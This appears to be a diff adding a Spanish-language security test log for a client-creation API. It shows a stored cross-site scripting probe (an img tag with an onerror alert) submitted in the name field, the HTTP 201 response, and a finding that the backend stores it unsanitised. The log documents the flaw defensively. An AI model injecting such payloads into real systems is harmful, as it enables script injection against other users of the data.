@@ -1,0 +1,6 @@
+> POST /clientes   [con token]
+  {"nombre": "<img src=x onerror=alert(document.domain)>", "correo": "xss_2b4ed9@qa.test"}
+< HTTP 201  (22 ms)
+  {"id":"31","nombre":"<img src=x onerror=alert(document.domain)>","correo":"xss_2b4ed9@qa.test","telefono":null,"direccion":null,"es_empresa":false,"rut":null,"n
+Valor almacenado en BD: <img src=x onerror=alert(document.domain)>
+=> El backend almacenó el payload sin sanear (HTTP 201); React lo escapa al mostrarlo (ver evidencia de interfaz), por lo que el riesgo queda latente para otros consumidores de la API
